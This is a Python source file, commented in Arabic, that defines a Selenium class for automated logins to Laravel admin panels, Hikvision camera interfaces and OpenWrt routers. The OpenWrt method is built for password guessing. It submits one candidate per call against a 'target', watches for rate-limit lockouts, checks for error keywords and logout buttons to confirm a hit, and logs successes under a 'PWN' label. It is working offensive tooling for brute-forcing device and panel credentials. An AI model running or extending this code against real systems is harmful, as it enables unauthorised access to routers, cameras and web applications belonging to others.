import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from engines.utils import log
from engines.platform_utils import find_chromium_binary

class BrowserAutomation:
    def __init__(self):
        self.chrome_options = Options()
        self.chrome_options.add_experimental_option("detach", True) # إبقاء المتصفح مفتوحاً بعد انتهاء السكربت
        browser = find_chromium_binary()
        if browser:
            self.chrome_options.binary_location = browser
        self.service = Service(ChromeDriverManager().install())
        self.driver = None

    def start_driver(self):
        try:
            self.driver = webdriver.Chrome(service=self.service, options=self.chrome_options)
            self.driver.maximize_window()
        except Exception as e:
            log(f"Failed to start Chrome: {e}", "ERROR")

    def auto_login_laravel(self, url, email, password):
        """الدخول التلقائي للوحات تحكم لارافل"""
        if not self.driver: self.start_driver()
        log(f"Attempting Auto-Login for Laravel at {url}...", "SUCCESS")
        
        try:
            self.driver.get(url)
            time.sleep(2) # انتظار تحميل الصفحة
            
            # البحث عن حقول الإدخال (بناءً على ما اكتشفناه في المحادثة)
            email_field = self.driver.find_element(By.NAME, "email")
            pass_field = self.driver.find_element(By.NAME, "password")
            
            email_field.send_keys(email)
            pass_field.send_keys(password)
            
            # الضغط على زر الدخول (غالباً ما يكون نوعه submit)
            pass_field.submit()
            
            log("Auto-Login sequence executed!", "PWN")
        except Exception as e:
            log(f"Auto-Login failed: {e}", "ERROR")

    def auto_login_hikvision(self, url, username, password):
        """الدخول التلقائي لواجهة Hikvision"""
        if not self.driver: self.start_driver()
        log(f"Attempting Auto-Login for Hikvision at {url}...", "SUCCESS")
        
        try:
            self.driver.get(url)
            time.sleep(3)
            
            user_field = self.driver.find_element(By.ID, "username") # معرفات شائعة في Hikvision
            pass_field = self.driver.find_element(By.ID, "password")
            
            user_field.send_keys(username)
            pass_field.send_keys(password)
            
            login_btn = self.driver.find_element(By.CLASS_NAME, "login-btn") # أو زر مشابه
            login_btn.click()
            
            log("Hikvision Auto-Login sequence executed!", "PWN")
        except:
            log("Failed to automate Hikvision login (complex UI)", "ERROR")
    def auto_login_openwrt(self, url, password):
        """دخول احترافي مع فحص رسائل الخطأ وبصمة النجاح"""
        if not self.driver: self.start_driver()
        log(f"Testing password '{password}' on target...", "INFO")
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # إدخال الباسورد
            pass_fields = self.driver.find_elements(By.TAG_NAME, "input")
            found_field = False
            for pf in pass_fields:
                if pf.get_attribute("type") == "password":
                    pf.clear()
                    pf.send_keys(password)
                    pf.submit()
                    found_field = True
                    break
            
            if not found_field:
                # محاولة الضغط على أي حقل نصي إذا لم نجد حقل باسورد صريح (بعض الواجهات تستخدم CSS)
                self.driver.execute_script("document.querySelector('input').value = arguments[0];", password)
                self.driver.execute_script("document.querySelector('input').form.submit();")

            # ننتظر قليلاً للتحقق من النتيجة
            time.sleep(5)
            
            # 1. فحص وجود حقل الباسورد (أقوى دليل على الفشل)
            current_pass_fields = self.driver.find_elements(By.TAG_NAME, "input")
            has_password_field = any(f.get_attribute("type") == "password" for f in current_pass_fields)
            
            # 2. فحص وجود رسائل خطأ
            page_text = self.driver.page_source.lower()
            
            # فحص القفل الزمني (Rate Limit)
            if "exceeded" in page_text or "try again in a minute" in page_text:
                log("RATE LIMIT DETECTED! Router is locked for 1 minute.", "WARNING")
                return "RATE_LIMITED"

            error_keywords = ["invalid", "wrong", "incorrect", "failed", "خطأ", "غير صحيح", "try again"]
            
            # إذا كان حقل الباسورد لا يزال موجوداً أو ظهرت رسالة خطأ، فالمحاولة فاشلة حتماً
            if has_password_field or any(k in page_text for k in error_keywords if k in page_text):
                log(f"Login FAILED for '{password}' (Password field still present or error detected)", "ERROR")
                return False

            # 3. فحص أدلة النجاح القاطعة (ظهور زر الخروج)
            success_indicators = ["logout", "signout", "خروج", "تسجيل الخروج"]
            
            # نبحث عن أي رابط أو زر يحتوي على كلمات الخروج
            page_elements = self.driver.find_elements(By.TAG_NAME, "a") + self.driver.find_elements(By.TAG_NAME, "button")
            found_logout = any(k in el.text.lower() for k in success_indicators for el in page_elements)
            
            current_url = self.driver.current_url.lower()
            
            # النجاح فقط إذا اختفى حقل الباسورد وظهر دليل على لوحة التحكم أو زر الخروج
            if not has_password_field and (found_logout or ("luci" in current_url and "login" not in current_url)):
                log(f"VERIFIED SUCCESS with password: {password}", "PWN")
                return True
            
            log(f"Could not verify success for '{password}', assuming failure.", "ERROR")
            return False
            
        except Exception as e:
            log(f"Verification error: {e}", "ERROR")
        return False
